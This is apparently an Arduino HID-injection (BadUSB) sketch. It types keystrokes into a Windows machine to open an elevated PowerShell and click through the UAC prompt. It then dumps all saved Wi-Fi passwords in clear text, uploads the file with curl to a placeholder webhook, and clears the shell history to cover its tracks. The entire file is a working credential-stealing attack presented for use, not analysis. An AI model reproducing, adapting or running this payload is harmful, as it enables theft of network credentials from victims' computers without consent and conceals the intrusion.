#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup() {
  
  Keyboard.begin();
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('m');
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("powershell");
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("$profiles = netsh wlan show profiles | Select-String \"All User Profile\\s+:\\s+(.+)\"");
  delay(1000);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("$profiles | ForEach-Object { $_.Matches.Groups[1].Value | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear } } | Out-File -FilePath \"output.txt\"");
  delay(1000);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.print("cmd");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("curl -X POST -H \"Content-Type: multipart/form-data\" -F \"file=@output.txt\" [Webhook URL]");
  delay(1500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("doskey /reinstall");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("exit");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("Clear-History");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("exit");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  // Ending stream
  Keyboard.end();
}

void loop() {
  // put your main code here, to run repeatedly:

}